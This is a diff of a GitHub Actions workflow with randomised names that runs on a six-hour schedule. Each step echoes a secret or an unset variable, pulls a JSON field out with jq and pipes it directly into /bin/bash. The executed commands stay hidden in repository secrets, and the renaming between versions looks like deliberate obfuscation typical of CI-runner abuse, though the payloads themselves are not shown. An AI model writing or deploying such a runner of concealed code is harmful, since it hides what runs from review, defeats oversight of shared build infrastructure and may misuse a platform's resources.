@@ -3,22 +3,23 @@ name: advantagemarried
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 3/6 * * *'
-
+    - cron: '28 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: advantagemarried
         env:
-          tg35933: ${{ secrets.tg35933 }}
+          j67340: ${{ secrets.j67340 }}
         run: |
-          echo $tg35933 | jq -r .qcri9378 | /bin/bash
-          echo $eaj1 | jq -r .sxg97 | /bin/bash
-          echo $vkvyl19282 | jq -r .l28 | /bin/bash
-          echo $vdhli11424 | jq -r .ob838 | /bin/bash
-          echo $vu37 | jq -r .r279 | /bin/bash
-          echo $i2 | jq -r .a6274 | /bin/bash
-          echo $lz676 | jq -r .cm5 | /bin/bash
+          echo $j67340 | jq -r .eo55145 | /bin/bash
+          echo $ztrtf020 | jq -r .waywe54395 | /bin/bash
+          echo $fvgs7510 | jq -r .ql3 | /bin/bash
+          echo $yo83375 | jq -r .mbu92149 | /bin/bash
+          echo $b913 | jq -r .nz8 | /bin/bash
+          echo $qxk37 | jq -r .misce0974 | /bin/bash
+          echo $y40 | jq -r .amfqg0 | /bin/bash
+          echo $r0644 | jq -r .v80 | /bin/bash
 
